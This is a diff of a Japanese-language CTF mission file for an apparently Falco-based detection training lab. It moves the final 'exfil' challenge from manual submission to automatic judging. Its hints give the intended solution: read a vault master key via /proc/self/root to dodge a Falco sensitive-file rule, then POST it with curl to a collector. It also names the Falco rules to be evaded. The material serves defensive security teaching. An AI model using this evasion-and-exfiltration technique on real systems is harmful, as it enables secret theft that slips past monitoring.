@@ -3,16 +3,16 @@
 # NOTE: evade/boss mission — never write the flag value here (public repo).
 challengeId: 10-final-exfil
 title: 最終持ち出し — ボス戦
-tagline: 禁止ルールを 1 本も踏まずに master key を読み、箱の外へ静かに持ち出して提出せよ
+tagline: 禁止ルールを 1 本も踏まずに別経路で master key を読み、箱の外へ静かに持ち出せ (提出操作は不要・自動判定)
 briefing: >-
   集大成。これまで学んだ「やってはいけないこと」を全て避けながら、master key を
-  読み・箱の外の collector へ静かに持ち出し (exfil)・提出する。禁止ルールは 7 つ —
-  この attempt で 1 つでも発火すると、やり直すまで提出できない (時間が経っても
-  自動的には解除されない)。加えてこのミッションは、素朴な cat を避けた「別経路での
-  読み」を実際に使ったことを示す positive-proof ルール (Nimbus Vault Master Key Read)
-  の発火を CLEARED の条件にしている — このルールが Me 画面の「発火させた Falco
-  ルール」(UI 見出し "Falco rules you triggered (last 60s)") に出るのは正常で、
-  ここだけ他ミッションと逆に、発火させないと成立しない。
+  素朴な cat を避けた別経路で読み、箱の外の collector へ静かに持ち出す (exfil)。
+  提出操作は不要で、条件が揃えば数秒以内に自動で判定される。条件は 3 つ — (1) 別経路で
+  読み、positive-proof ルール (Nimbus Vault Master Key Read) を発火させる
+  (2) collector へ exfil する (3) 禁止ルール 7 つを 1 本も発火させない。禁止ルールは
+  この attempt で 1 つでも発火すると、やり直すまで通らない (時間が経っても自動的には
+  解除されない)。positive-proof ルールの発火は CLEARED の条件で、Me 画面の発火した
+  ルールの一覧に出るのは正常 — 05 と同じく、ここでは発火させないと成立しない。
   単に読んで持ち出すだけでは通らない (requireExfil)。
 steps:
   - label: 禁止ルールを踏まずに master key を読む
@@ -20,29 +20,29 @@ steps:
       直接 cat せず、path 迂回で検知を回避した手口を master key の vault
       ファイル (/opt/nimbus/vault/master.key) に再利用してみよう。
       同じ回避がそのまま効く。この別経路での読みは禁止ルールを 1 本も踏まない
-      一方で、技法を実演したことを示す positive-proof ルール
-      (Nimbus Vault Master Key Read) を発火させる — この発火は正常で、
-      CLEARED の条件でもある (素朴な cat は逆に禁止ルール側を踏む)。
+      一方で、positive-proof ルール (Nimbus Vault Master Key Read) が発火する —
+      この発火は正常で、CLEARED の条件でもある (素朴な cat は逆に禁止ルール側を踏む)。
   - label: 既存の curl で collector へ静かに送る
     detail: |
       reverse shell (C2) や自前バイナリの drop+実行は禁止ルールに触れる。
       箱に元からある道具だけで collector (HTTP 受信のみ) へ静かに送る方法を考えよう。
       送信先は POST /api/challenges/10-final-exfil/exfil、payload は {"user","flag"}。
-  - label: 静かに提出する
+  - label: 自動判定を待つ
     detail: |
-      禁止ルールを 1 つも発火させていない状態で提出フォームから flag を送る。
-      一度でも発火させると検知されたと判定され、やり直すまで提出できない
-      (時間が経っても自動的には解除されない)。やり直すと exfil の記録も
-      消えるので、その場合はもう一度 (2) の持ち出しからやり直すこと。
+      提出操作は不要。禁止ルールを 1 つも発火させていない状態で、proof ルールの発火と
+      exfil が揃えば、数秒以内に自動で CLEARED になる。禁止ルールを一度でも発火させると
+      検知されたと判定され、やり直すまで通らない (時間が経っても自動的には解除されない)。
+      やり直すと exfil の記録も消えるので、その場合はもう一度 (2) の持ち出しから
+      やり直すこと。
 hints:
   - kind: rule
     text: >-
-      条件は 3 つ — 別経路で読む (技法の proof を発火させる) / collector へ exfil 済み /
+      条件は 3 つ — 別経路で読み positive-proof ルールを発火させる / collector へ exfil 済み /
       禁止ルールを 1 本も踏んでいない。禁止ルールはこれまでの 01〜09 で学んだ全 7 本 —
-      この attempt で 1 つでも発火させると、やり直すまで提出できなくなる (時間が経っても
-      自動的には解除されない)。加えてこのミッションは、別経路での読みを実際に使ったことを
-      示す positive-proof ルール Nimbus Vault Master Key Read の発火を CLEARED の条件に
-      している (ここだけ他ミッションと逆で、発火させないと成立しない)。
+      この attempt で 1 つでも発火させると、やり直すまで通らなくなる (時間が経っても
+      自動的には解除されない)。加えてこのミッションは、positive-proof ルール
+      Nimbus Vault Master Key Read の発火を CLEARED の条件にしている
+      (05 と同じく、発火させないと成立しない)。
     ruleRefs:
       - Contact K8S API Server From Container
       - Read sensitive file untrusted
@@ -63,9 +63,9 @@ hints:
       想定解:
       FLAG=$(cat /proc/self/root/opt/nimbus/vault/master.key)
       # /proc/self/root 経由の別経路で読むので、禁止ルール (Read sensitive file
-      # untrusted) は踏まない (03 の技法の再利用)。代わりにこの別経路での読みが
-      # positive-proof ルール Nimbus Vault Master Key Read を発火させ、技法を使った
-      # 証明になる — この発火は正常で CLEARED の条件 (素朴な cat は逆に禁止ルール側を踏む)
+      # untrusted) は踏まない (03 の技法の再利用)。この読みでは positive-proof ルール
+      # Nimbus Vault Master Key Read が発火する — この発火は正常で CLEARED の条件
+      # (素朴な cat は逆に禁止ルール側を踏む)
 
       curl -s "$FALCO_CTF_COLLECTOR/api/challenges/10-final-exfil/exfil" \
         -H 'Content-Type: application/json' \
@@ -74,12 +74,11 @@ hints:
       # drop+実行は禁止ルールに触れるのでここでは使わない。
       # 提出操作は不要 — collector が exfil を受け取り、proof ルール
       # (Nimbus Vault Master Key Read) が発火済みで、禁止ルールを 1 つも
-      # 踏んでいなければ数秒以内に自動で CLEARED になる (別経路での読み自体が
-      # proof を立てるので、通常は追加操作は要らない。禁止ルールを 1 つでも
+      # 踏んでいなければ数秒以内に自動で CLEARED になる (禁止ルールを 1 つでも
       # 発火させていた場合はこの attempt では通らない。やり直すと exfil の
       # 記録も消えるので、その場合は curl の送信からやり直すこと)
 bridge: >-
-  master key は、Falco に一度も気づかれることなく箱の外へ抜けた。CTF Company の
+  master key は、禁止ルールには一度も触れることなく箱の外へ抜けた。CTF Company の
   キルチェーンは踏破 — だが本当の学びは攻撃側ではない。あなたが避けた検知の一つ一つが、
   守る側が仕掛けるべき網だ。攻撃者の手口を知る者だけが、それを塞げる。作戦完了。
 docsUrl: /missions/10-final-exfil/
